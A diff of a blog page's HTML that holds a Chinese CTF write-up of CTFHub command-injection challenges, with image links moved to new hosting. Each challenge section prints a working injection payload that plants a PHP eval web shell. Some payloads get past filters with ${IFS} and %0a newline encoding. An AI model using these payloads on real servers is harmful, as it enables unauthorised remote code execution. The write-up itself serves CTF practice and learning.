@@ -27,31 +27,31 @@
 <meta property="og:site_name" content="N0us&#39;s Blog">
 <meta property="og:description" content="CTFHub Web RCE 部分题解记录一下CTFHub 部分的题目，这个平台的题比较简单，基本是面向刚开始接触CTF的师傅搭知识框架用的，这篇文章主要记录一下各种linux命令过滤绕过的姿势 0x00.命令注入-无过滤 很简单，无过滤，所以直接造就好，先查看一下目录下有什么文件：     11;ls   cat 一下，没输出： 11;cat .&#x2F;83251700228763.php   遂传马">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/imageb6697322c60d1d2d.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/imagef2afcfad69b10fab.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/imageb2459a3b72d76a74.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image6e19004ea99897be.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image9e516526d4acca1e.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image5f36d261b668ac99.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image7d590c175481644e.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image2f9a946d6b71629e.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/imagefc3a9269cda2186a.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/imagecfcc6b412110c4af.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image5d0790e9464c9bc5.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/imagec2fd509e9a80f750.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image5b28220a2b2cd7ed.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image3827f4f638b612f9.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image9ca9486cf9ee8825.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image715d8033fc16a421.png">
-<meta property="og:image" content="http://picture.2er0blog.com/images/2020/04/27/image60b68c53b1139cb9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015161332.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015161628.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162153.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162251.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162301.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162308.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162321.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162404.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162432.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162544.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162800.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162827.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162838.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162846.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162853.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162904.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162915.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162959.png">
 <meta property="article:published_time" content="2020-04-27T15:07:02.000Z">
-<meta property="article:modified_time" content="2020-04-27T15:08:09.380Z">
+<meta property="article:modified_time" content="2020-10-15T08:30:11.090Z">
 <meta property="article:author" content="N0us">
 <meta property="article:tag" content="CTFhub">
 <meta property="article:tag" content="RCE">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://picture.2er0blog.com/images/2020/04/27/image.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015161332.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
@@ -448,28 +448,28 @@ height:50vh;
             <main class="main post-page">
     <article class="article-entry">
         <h1 id="CTFHub-Web-RCE-部分题解"><a href="#CTFHub-Web-RCE-部分题解" class="headerlink" title="CTFHub Web RCE 部分题解"></a>CTFHub Web RCE 部分题解</h1><p>记录一下CTFHub 部分的题目，这个平台的题比较简单，基本是面向刚开始接触CTF的师傅搭知识框架用的，这篇文章主要记录一下各种linux命令过滤绕过的姿势</p>
-<h2 id="0x00-命令注入-无过滤"><a href="#0x00-命令注入-无过滤" class="headerlink" title="0x00.命令注入-无过滤"></a>0x00.命令注入-无过滤</h2><p><img src="http://picture.2er0blog.com/images/2020/04/27/image.png" alt="image.png"></p>
+<h2 id="0x00-命令注入-无过滤"><a href="#0x00-命令注入-无过滤" class="headerlink" title="0x00.命令注入-无过滤"></a>0x00.命令注入-无过滤</h2><p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015161332.png" alt="image.png"></p>
 <p>很简单，无过滤，所以直接造就好，先查看一下目录下有什么文件：    </p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;ls</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://picture.2er0blog.com/images/2020/04/27/imageb6697322c60d1d2d.png" alt="imageb6697322c60d1d2d.png"></p>
+<p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015161628.png" alt=""></p>
 <p>cat 一下，没输出：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;cat ./83251700228763.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://picture.2er0blog.com/images/2020/04/27/imagef2afcfad69b10fab.png" alt="imagef2afcfad69b10fab.png"></p>
+<p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162153.jpg" alt=""></p>
 <p>遂传马：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;echo "&lt;?php @eval(\$_POST['a']);?&gt;" &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://picture.2er0blog.com/images/2020/04/27/imageb2459a3b72d76a74.png" alt="imageb2459a3b72d76a74.png"></p>
+<p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162251.png" alt="imageb2459a3b72d76a74.png"></p>
 <p>蚁剑连接，找到flag：</p>
-<p><img src="http://picture.2er0blog.com/images/2020/04/27/image6e19004ea99897be.png" alt="image6e19004ea99897be.png"></p>
-<h2 id="0x01-命令注入-过滤cat"><a href="#0x01-命令注入-过滤cat" class="headerlink" title="0x01.命令注入-过滤cat"></a>0x01.命令注入-过滤cat</h2><p><img src="http://picture.2er0blog.com/images/2020/04/27/image9e516526d4acca1e.png" alt="image9e516526d4acca1e.png"></p>
+<p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162301.png" alt="image6e19004ea99897be.png"></p>
+<h2 id="0x01-命令注入-过滤cat"><a href="#0x01-命令注入-过滤cat" class="headerlink" title="0x01.命令注入-过滤cat"></a>0x01.命令注入-过滤cat</h2><p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162308.png" alt="image9e516526d4acca1e.png"></p>
 <p>看源码发现过滤了cat，emmmmm，那直接传马就好了。。。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;echo "&lt;?php @eval(\$_POST['a']);?&gt;" &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
 
 <p>蚁剑连接，拿到flag：</p>
-<p><img src="http://picture.2er0blog.com/images/2020/04/27/image5f36d261b668ac99.png" alt="image5f36d261b668ac99.png"></p>
-<h2 id="0x02-命令注入-过滤空格"><a href="#0x02-命令注入-过滤空格" class="headerlink" title="0x02.命令注入-过滤空格"></a>0x02.命令注入-过滤空格</h2><p><img src="http://picture.2er0blog.com/images/2020/04/27/image7d590c175481644e.png" alt="image7d590c175481644e.png"></p>
+<p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162321.png" alt="image5f36d261b668ac99.png"></p>
+<h2 id="0x02-命令注入-过滤空格"><a href="#0x02-命令注入-过滤空格" class="headerlink" title="0x02.命令注入-过滤空格"></a>0x02.命令注入-过滤空格</h2><p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162404.png" alt=""></p>
 <p>这次过滤了空格，这意味着payload中不能有空格，查阅资料，shell脚本中有个变量 <strong>IFS</strong>(Internal Field Seprator)，内部域分隔符，完整定义：</p>
 <blockquote>
 <p>The shell uses the value stored in IFS, which is the space, tab, and newline characters by default, to delimit words for the read and set commands, when parsing output from command substitution, and when performing variable substitution.</p>
@@ -478,28 +478,28 @@ height:50vh;
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;echo$&#123;IFS&#125;"&lt;?php$&#123;IFS&#125;@eval(\$_POST['a']);?&gt;"&gt;&gt;shell.php</span><br></pre></td></tr></table></figure>
 
 <p>蚁剑连接，得到flag：</p>
-<p><img src="http://picture.2er0blog.com/images/2020/04/27/image2f9a946d6b71629e.png" alt="image2f9a946d6b71629e.png"></p>
-<h2 id="0x03-命令注入-过滤目录分隔符"><a href="#0x03-命令注入-过滤目录分隔符" class="headerlink" title="0x03.命令注入-过滤目录分隔符"></a>0x03.命令注入-过滤目录分隔符</h2><p><img src="http://picture.2er0blog.com/images/2020/04/27/imagefc3a9269cda2186a.png" alt="imagefc3a9269cda2186a.png"></p>
+<p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162432.png" alt="image2f9a946d6b71629e.png"></p>
+<h2 id="0x03-命令注入-过滤目录分隔符"><a href="#0x03-命令注入-过滤目录分隔符" class="headerlink" title="0x03.命令注入-过滤目录分隔符"></a>0x03.命令注入-过滤目录分隔符</h2><p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162544.png" alt=""></p>
 <p>查看代码发现过滤了目录分隔符，那么直接传马：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;echo "&lt;?php @eval(\$_POST['a']);?&gt;" &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://picture.2er0blog.com/images/2020/04/27/imagecfcc6b412110c4af.png" alt="imagecfcc6b412110c4af.png"></p>
+<p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162800.png" alt=""></p>
 <p>蚁剑连上，进入flag_is_here目录，拿到flag：</p>
-<p><img src="http://picture.2er0blog.com/images/2020/04/27/image5d0790e9464c9bc5.png" alt="image5d0790e9464c9bc5.png"></p>
-<h2 id="0x04-命令注入-过滤运算符"><a href="#0x04-命令注入-过滤运算符" class="headerlink" title="0x04.命令注入-过滤运算符"></a>0x04.命令注入-过滤运算符</h2><p><img src="http://picture.2er0blog.com/images/2020/04/27/imagec2fd509e9a80f750.png" alt="imagec2fd509e9a80f750.png"></p>
+<p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162827.png" alt="image5d0790e9464c9bc5.png"></p>
+<h2 id="0x04-命令注入-过滤运算符"><a href="#0x04-命令注入-过滤运算符" class="headerlink" title="0x04.命令注入-过滤运算符"></a>0x04.命令注入-过滤运算符</h2><p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162838.png" alt="imagec2fd509e9a80f750.png"></p>
 <p>查看代码，发现过滤了<code>|</code>和<code>&amp;</code>符号，意味着不能使用这两个符号来连接命令，但是并没有过滤掉<code>;</code>，所以直接使用分号来执行多个命令就可以了：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;echo "&lt;?php @eval(\$_POST['a']);?&gt;" &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://picture.2er0blog.com/images/2020/04/27/image5b28220a2b2cd7ed.png" alt="image5b28220a2b2cd7ed.png"></p>
+<p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162846.png" alt="image5b28220a2b2cd7ed.png"></p>
 <p>蚁剑连接，拿到flag：</p>
-<p><a href="http://picture.2er0blog.com/image/hiwE" target="_blank" rel="noopener"><img src="http://picture.2er0blog.com/images/2020/04/27/image3827f4f638b612f9.png" alt="image3827f4f638b612f9.png"></a></p>
-<h2 id="0x04-命令注入-综合练习"><a href="#0x04-命令注入-综合练习" class="headerlink" title="0x04.命令注入-综合练习"></a>0x04.命令注入-综合练习</h2><p><a href="http://picture.2er0blog.com/image/hvGX" target="_blank" rel="noopener"><img src="http://picture.2er0blog.com/images/2020/04/27/image9ca9486cf9ee8825.png" alt="image9ca9486cf9ee8825.png"></a></p>
+<p><a href="http://picture.2er0blog.com/image/hiwE" target="_blank" rel="noopener"><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162853.png" alt="image3827f4f638b612f9.png"></a></p>
+<h2 id="0x04-命令注入-综合练习"><a href="#0x04-命令注入-综合练习" class="headerlink" title="0x04.命令注入-综合练习"></a>0x04.命令注入-综合练习</h2><p><a href="http://picture.2er0blog.com/image/hvGX" target="_blank" rel="noopener"><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162904.png" alt="image9ca9486cf9ee8825.png"></a></p>
 <p>看下代码，发现过滤了<code>|</code> <code>&amp;</code> <code>;</code> <code>空格</code> <code>/</code> <code>cat</code> <code>flag</code> <code>ctfhub</code> ，基本上就是全过滤了，参考了大佬的博客，发现可以利用换行符和回车符的URL编码<code>%0a</code> <code>%0d</code> 直接构造URL实现传马，下面是我构造的payload：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=1%0aecho$&#123;IFS&#125;"&lt;?php$&#123;IFS&#125;@eval(\$_POST['a'])?&gt;"&gt;&gt;shell.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://picture.2er0blog.com/images/2020/04/27/image715d8033fc16a421.png" alt="image715d8033fc16a421.png"></p>
-<p> 成功穿上，蚁剑连接，拿到flag：</p>
-<p><img src="http://picture.2er0blog.com/images/2020/04/27/image60b68c53b1139cb9.png" alt="image60b68c53b1139cb9.png"></p>
+<p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162915.png" alt="image715d8033fc16a421.png"></p>
+<p> 成功传上，蚁剑连接，拿到flag：</p>
+<p><img src="https://raw.githubusercontent.com/MarkIlV/PicStorage/main/Blog/20201015162959.png" alt=""></p>
 <blockquote>
 <p>参考资料：</p>
 <ul>
@@ -765,11 +765,6 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/30</span><a class="archive-post-title" href= "/2020/06/30/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" >SQL注入总结</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">04/27</span><a class="archive-post-title" href= "/2020/04/27/CTFHub%20Web%20RCE%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" >CTFHub Web RCE 部分题解</a>
         </li>
     
@@ -795,12 +790,26 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/22</span><a class="archive-post-title" href= "/2020/03/22/VsCode_Theme/" >从头开始设计自己的vscode主题插件</a>
+            <span class="archive-post-date">03/22</span><a class="archive-post-title" href= "/2020/03/22/VsCode_Theme/" >CVE-2019-1338复现</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/22</span><a class="archive-post-title" href= "/2020/03/22/CVE-2019-1338%E5%A4%8D%E7%8E%B0/" >CVE-2019-1338 Windows 证书对话框提权</a>
+            <span class="archive-post-date">03/22</span><a class="archive-post-title" href= "/2020/03/22/CVE-2019-1338%E5%A4%8D%E7%8E%B0/" >CVE-2019-1338复现</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/06/30/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" >SQL注入总结</a>
         </li>
     
     </div>
